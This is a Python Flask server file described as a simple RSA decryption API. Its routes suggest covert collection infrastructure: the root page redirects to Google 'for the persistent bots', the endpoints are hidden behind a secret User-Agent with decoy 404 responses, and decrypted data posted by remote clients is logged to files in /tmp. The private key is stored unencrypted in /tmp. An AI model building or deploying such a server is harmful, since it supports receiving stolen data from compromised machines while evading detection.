"""
Server.py is a simple Flask application that provides an API for decrypting data
using an RSA private key. The application also provides an API for retrieving the
RSA public key. The RSA private key is generated and stored in a file on the server.
The private key is updated every 3 minutes to ensure that the key is rotated
frequently. The application uses the cryptography library to perform RSA encryption
and decryption.

The application consists of two main routes:
- /api/v1/post: This route accepts POST requests with encrypted data in the request body.
The data is decrypted using the RSA private key, and the decrypted data is written to a log file.
- /api/v1/public_key: This route accepts GET requests and returns the RSA public key in PEM format.
"""

import threading
import time
import datetime
from flask import Flask, request, Response, abort, redirect
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from modules.crypto_utils import oaep_padding

app = Flask(__name__)

KEY_FILE = '/tmp/key_pair.pem'

def load_key_pair():
    """
    Load the RSA key pair from the key file.

    This function loads the RSA key pair from the key file on the server.

    Returns:
        tuple: A tuple containing the RSA private key and
        the RSA public key.

    Raises:
        FileNotFoundError: The key file does not exist.

    """
    try:
        with open(KEY_FILE, 'rb') as f:
            private_key = serialization.load_pem_private_key(
                f.read(),
                password=None
            )
            public_key = private_key.public_key()
    except FileNotFoundError:
        private_key, public_key = generate_key_pair()
        save_key_pair(private_key, public_key)
    return private_key, public_key

def generate_key_pair():
    """
    Generate a new RSA key pair.

    This function generates a new RSA key pair with a key size of 2048 bits.

    Returns:
        tuple: A tuple containing the RSA private key and
        the RSA public key.

    Raises:
        ValueError: An error occurred while generating the key pair.
    """
    key_size = 2048

    try:
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=key_size
        )
    except ValueError as e:
        raise e
    public_key = private_key.public_key()
    return private_key, public_key

def save_key_pair(private_key, public_key):
    """
    Save the RSA key pair to the key file.
    
    This function saves the RSA key pair to the key file on the server.
    
    Args:
        private_key (cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey): RSA private key.
        public_key (cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicKey): RSA public key.
        
    Returns:
        None

    Raises:
        FileNotFoundError: The key file does not exist.
    """
    try:
        with open(KEY_FILE, 'wb') as f:
            f.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))
            f.write(public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ))
    except FileNotFoundError as e:
        raise e

def update_key_pair():
    """
    Update the RSA key pair at a preset time in seconds.
    Default time is 180 seconds.

    This function generates a new RSA key pair and saves it to the key file
    every 3 minutes (as specified by the time.sleep() function).
    """
    while True:
        private_key, public_key = generate_key_pair()
        save_key_pair(private_key, public_key)
        time.sleep(180)

threading.Thread(target=update_key_pair, daemon=True).start()

def decrypt_data(encrypted_data):
    """
    Decrypt the provided data using the RSA private key.
    
    This function decrypts the provided data using the RSA private key with OAEP
    padding and SHA-256 hashing.
    
    Args:
        encrypted_data (bytes): The data to decrypt.
    
    Returns:
        bytes: The decrypted data.
        
    Raises:
        ValueError: An error occurred while decrypting the data.
    """
    private_key, _ = load_key_pair()
    try:
        decrypted_data = private_key.decrypt(
            encrypted_data,
            oaep_padding()
        )
    except ValueError as e:
        raise e
    return decrypted_data

@app.route('/')
def index():
    """
    Redirects for the persistent bots
    
    Returns:
        Response: A Flask Response object with a redirect to Google.
    """
    return redirect("https://www.google.com")

@app.route('/api/v1/post', methods=['POST', 'GET'])
def decrypt_view():
    """
    Decrypt the encrypted data and write it to a log file.
    
    This function decrypts the encrypted data in the request body using the RSA
    private key and writes the decrypted data to a log file. Requires
    the User-Agent header to be set to specific value.
    
    Returns:
        Response: A Flask Response object with status code 200.
        
    Raises:
        ValueError: An error occurred while decrypting the data.
    """
    encrypted_data = request.data
    user_agent = request.headers.get('User-Agent')
    if user_agent != "SpecificUserAgent":
        abort(404)
    if request.method == 'GET':
        abort(404)
    try:
        decrypted_data = decrypt_data(encrypted_data)
        log_file = f"/tmp/log_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
        with open(log_file, 'a', encoding="utf-8") as f:
            f.write(decrypted_data.decode())
        return Response(status=200)
    except ValueError:
        return Response(status=404)

@app.route('/api/v1/public_key', methods=['GET'])
def get_public_key():
    """
    Return the RSA public key in PEM format.
    
    This function returns the RSA public key in PEM format. Requires
    the User-Agent header to be set to specific value.
    
    Returns:
        tuple: A tuple containing the RSA public key in PEM format, status code 200,
        and the Content-Type header set to text/plain.
        
    Raises:
        404: The request does not contain the specified User-Agent header.
    """
    user_agent = request.headers.get('User-Agent')
    if user_agent != "SpecificUserAgent":
        abort(404)
    _, public_key = load_key_pair()
    return public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ), 200, {'Content-Type': 'text/plain'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
